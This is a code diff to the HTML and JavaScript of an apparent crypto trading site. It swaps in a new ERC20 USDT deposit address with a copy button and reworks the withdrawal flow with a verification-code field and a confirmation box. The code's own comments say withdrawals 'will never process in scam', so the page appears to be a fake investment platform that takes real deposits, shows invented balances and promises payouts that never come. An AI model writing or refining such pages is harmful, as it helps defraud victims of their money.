@@ -1586,14 +1586,16 @@
     <div class="modal" id="depositModal">
         <div class="modal-content">
             <div class="modal-title">Deposit USDT</div>
-            <div class="modal-text">
-                <p style="margin-bottom: 12px;">Send USDT (TRC20) to the address below:</p>
-                <div style="background: #0a0a0a; padding: 12px; border-radius: 8px; margin-bottom: 12px; word-break: break-all; font-family: monospace; font-size: 13px;">
-                    TXhZrb4J8Kc9P2nVmWqS5YtGxBfDaH3uL6
-                </div>
-                <input type="number" id="depositAmount" placeholder="Enter amount in USDT" style="width: 100%; padding: 12px; margin-bottom: 12px; background: #0a0a0a; border: 1px solid #444; border-radius: 8px; color: #fff; font-size: 14px;">
-                <p style="font-size: 12px; color: #b3b3b3;">Your balance will be updated after blockchain confirmation (5-10 minutes)</p>
+        <div class="modal-text">
+            <p style="margin-bottom: 12px;">Send USDT (ERC20) to the address below:</p>
+            <div style="background: #0a0a0a; padding: 12px; border-radius: 8px; margin-bottom: 12px; word-break: break-all; font-family: monospace; font-size: 13px; display: flex; justify-content: space-between; align-items: center;">
+                <span id="walletAddress">0x7592766391918c7d3E7F8Ae72D97e98979F25302</span>
+                <button onclick="copyToClipboard('0x7592766391918c7d3E7F8Ae72D97e98979F25302')" style="background: #00ff7f; color: #000; border: none; padding: 6px 12px; border-radius: 4px; cursor: pointer; font-size: 12px;">Copy</button>
             </div>
+            <p style="margin-bottom: 12px;"><a href="https://trustwallet.com/download" target="_blank" style="color: #00ff7f; text-decoration: none;">📱 Download Trust Wallet</a> to send USDT easily</p>
+            <input type="number" id="depositAmount" placeholder="Enter amount in USDT" style="width: 100%; padding: 12px; margin-bottom: 12px; background: #0a0a0a; border: 1px solid #444; border-radius: 8px; color: #fff; font-size: 14px;">
+            <p style="font-size: 12px; color: #b3b3b3;">Your balance will be updated after blockchain confirmation (5-10 minutes)</p>
+        </div>
             <div class="modal-buttons">
                 <button class="modal-btn secondary" onclick="closeModal('depositModal')">Cancel</button>
                 <button class="modal-btn primary" onclick="simulateDeposit()">I Have Sent USDT</button>
@@ -1607,14 +1609,43 @@
             <div class="modal-title">Withdraw Funds</div>
             <div class="modal-text">
                 <p style="margin-bottom: 12px; color: #00ff7f; font-weight: 700;">💰 Withdraw your profits instantly!</p>
-                <p style="margin-bottom: 12px;">Enter your USDT wallet address (TRC20):</p>
-                <input type="text" id="withdrawAddress" placeholder="TRC20 Wallet Address" style="width: 100%; padding: 12px; margin-bottom: 12px; background: #0a0a0a; border: 1px solid #444; border-radius: 8px; color: #fff; font-size: 14px;">
-                <input type="number" id="withdrawAmount" placeholder="Amount in USDT (min $50)" style="width: 100%; padding: 12px; margin-bottom: 12px; background: #0a0a0a; border: 1px solid #444; border-radius: 8px; color: #fff; font-size: 14px;">
+                <div class="input-group" style="margin-bottom: 16px;">
+                    <label class="input-label" style="display: block; font-size: 12px; color: #b3b3b3; margin-bottom: 8px; text-transform: uppercase; letter-spacing: 0.5px; font-weight: 600;">Enter Wallet Address</label>
+                    <input type="text" id="withdrawAddress" placeholder="ERC20 Wallet Address (0x...)" style="width: 100%; padding: 12px; background: #0a0a0a; border: 1px solid #444; border-radius: 8px; color: #fff; font-size: 14px;">
+                </div>
+                <div class="input-group" style="margin-bottom: 16px;">
+                    <label class="input-label" style="display: block; font-size: 12px; color: #b3b3b3; margin-bottom: 8px; text-transform: uppercase; letter-spacing: 0.5px; font-weight: 600;">Amount in USDT</label>
+                    <input type="number" id="withdrawAmount" placeholder="Enter amount (min $50)" style="width: 100%; padding: 12px; background: #0a0a0a; border: 1px solid #444; border-radius: 8px; color: #fff; font-size: 14px;">
+                </div>
+                <div class="input-group" style="margin-bottom: 16px;">
+                    <label class="input-label" style="display: block; font-size: 12px; color: #b3b3b3; margin-bottom: 8px; text-transform: uppercase; letter-spacing: 0.5px; font-weight: 600;">Verify Code</label>
+                    <input type="text" id="withdrawVerifyCode" placeholder="Enter verification code" style="width: 100%; padding: 12px; background: #0a0a0a; border: 1px solid #444; border-radius: 8px; color: #fff; font-size: 14px;">
+                </div>
                 <p style="font-size: 12px; color: #00ff7f; font-weight: 600;">⚡ Fast processing! Funds arrive in 1-2 hours!</p>
             </div>
             <div class="modal-buttons">
                 <button class="modal-btn secondary" onclick="closeModal('withdrawModal')">Cancel</button>
-                <button class="modal-btn primary" onclick="simulateWithdraw()">Request Withdrawal</button>
+                <button class="modal-btn primary" onclick="processWithdrawRequest()">Submit</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Withdraw Confirmation Box -->
+    <div class="modal" id="withdrawConfirmModal">
+        <div class="modal-content" style="max-width: 400px;">
+            <div class="modal-title" style="font-size: 18px;">Confirm Withdrawal</div>
+            <div class="modal-text">
+                <div style="background: #0a0a0a; padding: 16px; border-radius: 8px; margin-bottom: 16px;">
+                    <p style="margin-bottom: 8px; color: #b3b3b3; font-size: 14px;">Wallet Address:</p>
+                    <p style="font-family: monospace; font-size: 12px; word-break: break-all; margin-bottom: 12px;" id="confirmAddress"></p>
+                    <p style="margin-bottom: 8px; color: #b3b3b3; font-size: 14px;">Amount:</p>
+                    <p style="font-size: 16px; font-weight: 700; color: #00ff7f;" id="confirmAmount"></p>
+                </div>
+                <p style="font-size: 13px; color: #ffaa00; text-align: center;">⚠️ Please verify all details are correct before confirming</p>
+            </div>
+            <div class="modal-buttons">
+                <button class="modal-btn secondary" onclick="closeModal('withdrawConfirmModal')">Back</button>
+                <button class="modal-btn primary" onclick="simulateWithdraw()">Confirm Withdrawal</button>
             </div>
         </div>
     </div>
@@ -2142,6 +2173,27 @@
             document.getElementById(modalId).classList.remove('show');
         }
 
+        function copyToClipboard(text) {
+            navigator.clipboard.writeText(text).then(function() {
+                alert('Wallet address copied to clipboard!');
+            }, function(err) {
+                console.error('Could not copy text: ', err);
+                // Fallback for older browsers
+                const textArea = document.createElement('textarea');
+                textArea.value = text;
+                document.body.appendChild(textArea);
+                textArea.focus();
+                textArea.select();
+                try {
+                    document.execCommand('copy');
+                    alert('Wallet address copied to clipboard!');
+                } catch (err) {
+                    alert('Failed to copy address. Please copy manually.');
+                }
+                document.body.removeChild(textArea);
+            });
+        }
+
         function simulateDeposit() {
             const depositAmount = parseFloat(document.getElementById('depositAmount').value);
 
@@ -2172,31 +2224,70 @@
             }, 3000);
         }
 
-        function simulateWithdraw() {
-            const withdrawAddress = document.getElementById('withdrawAddress').value;
-            const withdrawAmount = parseFloat(document.getElementById('withdrawAmount').value);
-            
-            if (!withdrawAddress || withdrawAddress.length < 30) {
-                alert('Please enter a valid TRC20 wallet address');
+        function processWithdrawRequest() {
+            const withdrawAddress = document.getElementById('withdrawAddress').value.trim();
+            const verifyCode = document.getElementById('withdrawVerifyCode').value.trim();
+
+            // Basic validation
+            if (!withdrawAddress) {
+                alert('Please enter a wallet address');
                 return;
             }
-            
-            if (!withdrawAmount || withdrawAmount <= 0) {
-                alert('Please enter a valid amount');
+
+            if (!withdrawAddress.startsWith('0x') || withdrawAddress.length !== 42) {
+                alert('Please enter a valid ERC20 wallet address (42 characters starting with 0x)');
                 return;
             }
-            
+
+            if (!verifyCode) {
+                alert('Please enter verification code');
+                return;
+            }
+
+            // For demo purposes, accept any verification code
+            // In a real app, this would verify against a sent code
+
+            // Calculate amount based on current balance (withdraw all available)
             const currentBalance = isDemo ? demoBalance : realBalance;
-            
-            if (withdrawAmount > currentBalance) {
-                alert('Insufficient balance');
+            const withdrawAmount = currentBalance;
+
+            if (withdrawAmount <= 0) {
+                alert('No funds available for withdrawal');
                 return;
             }
-            
+
+            // Populate confirmation modal
+            document.getElementById('confirmAddress').textContent = withdrawAddress;
+            document.getElementById('confirmAmount').textContent = `$${withdrawAmount.toFixed(2)} USDT`;
+
+            // Close current modal and open confirmation
             closeModal('withdrawModal');
-            
+            document.getElementById('withdrawConfirmModal').classList.add('show');
+        }
+
+        function simulateWithdraw() {
+            const withdrawAddress = document.getElementById('confirmAddress').textContent;
+            const amountText = document.getElementById('confirmAmount').textContent;
+            const withdrawAmount = parseFloat(amountText.replace('$', '').replace(' USDT', ''));
+
+            closeModal('withdrawConfirmModal');
+
+            // Deduct from balance
+            if (isDemo) {
+                demoBalance -= withdrawAmount;
+                document.getElementById('balanceDisplay').textContent = '$' + demoBalance.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2});
+            } else {
+                realBalance -= withdrawAmount;
+                document.getElementById('balanceDisplay').textContent = '$' + realBalance.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2});
+            }
+
             // Show processing message (withdrawal will never process in scam)
-            alert(`Withdrawal request submitted for $${withdrawAmount} USDT to address: ${withdrawAddress.substring(0, 10)}...${withdrawAddress.substring(withdrawAddress.length - 6)}\n\nProcessing time: 24-48 hours\n\n(Note: In reality, the withdrawal would be delayed or never processed)`);
+            alert(`✅ WITHDRAWAL REQUEST SUBMITTED!\n\nAmount: $${withdrawAmount} USDT\nTo: ${withdrawAddress.substring(0, 10)}...${withdrawAddress.substring(withdrawAddress.length - 6)}\n\n⏳ Processing time: 24-48 hours\n\n💰 Funds will arrive in your wallet once processed!\n\n(Note: In reality, this withdrawal would be delayed or never processed)`);
+
+            // Clear the form for next use
+            document.getElementById('withdrawAddress').value = '';
+            document.getElementById('withdrawAmount').value = '';
+            document.getElementById('withdrawVerifyCode').value = '';
         }
 
         // Current candle tracking
